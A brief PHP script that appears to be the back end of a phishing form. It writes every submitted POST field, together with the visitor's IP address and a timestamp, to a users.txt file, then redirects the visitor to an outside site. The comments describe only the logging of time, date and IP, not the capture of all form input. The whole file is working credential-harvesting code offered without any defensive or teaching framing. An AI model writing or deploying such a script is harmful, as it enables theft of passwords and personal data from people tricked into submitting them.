<?php

/**
 * Writing the time and date 
 * Writing the IP ADDRESS to a file 
 */
 $handle = fopen('users.txt', 'a');

 foreach($_POST as $variable => $value) {
     fwrite($handle, $variable . '=' . $value . PHP_EOL);
 }

/** 
 * Grabbing the REMOTE IP ADDRESS 
 * Logging the time and date 
 */
 fwrite($handle, 'REMOTE IP ADDRESS: ' . $_SERVER['REMOTE_ADDR'] . $time = date(" l F dS h:i A Y") . PHP_EOL);
 fclose($handle);

/**
 * Redirectng to a different page 
 */
 header('Location: https://asdjsonyou.dev/');
 exit;



